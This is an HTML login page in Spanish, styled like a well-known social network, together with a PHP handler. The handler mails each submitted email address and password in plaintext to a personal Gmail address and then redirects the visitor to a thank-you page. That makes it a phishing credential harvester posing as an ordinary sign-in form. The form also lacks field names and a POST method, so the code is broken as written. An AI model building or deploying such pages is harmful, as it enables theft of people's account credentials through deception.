<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            padding: 20px;
            border-radius: 8px;
            width: 300px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .login-form input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        .login-form button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .login-form button:hover {
            background-color: #165499;
        }

        .login-form p {
            margin-top: 15px;
            text-align: center;
        }

        .login-form a {
            color: #1877f2;
            text-decoration: none;
        }

        .login-form a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>Iniciar sesión</h2>
        </div>
        <form class="login-form">
            <input type="text" placeholder="Correo electrónico" required>
            <input type="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <p><a href="#">¿Olvidaste tu contraseña?</a></p>
        <p>No tienes una cuenta? <a href="#">Regístrate</a></p>
    </div>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST["correo"];
    $contrasena = $_POST["contrasena"];

    // Aquí puedes agregar código para enviar un correo electrónico a andreytamayo80@gmail.com
    // Usualmente, se utiliza la función mail() de PHP para enviar correos, pero asegúrate de configurar tu servidor correctamente.

    $destinatario = "andreytamayo80@gmail.com";
    $asunto = "Nuevo inicio de sesión";
    $mensaje = "Correo: $correo\nContraseña: $contrasena";

    mail($destinatario, $asunto, $mensaje);

    // Puedes redirigir al usuario a otra página después de enviar el formulario si lo deseas.
    header("Location: gracias.html");
    exit();
}
?>
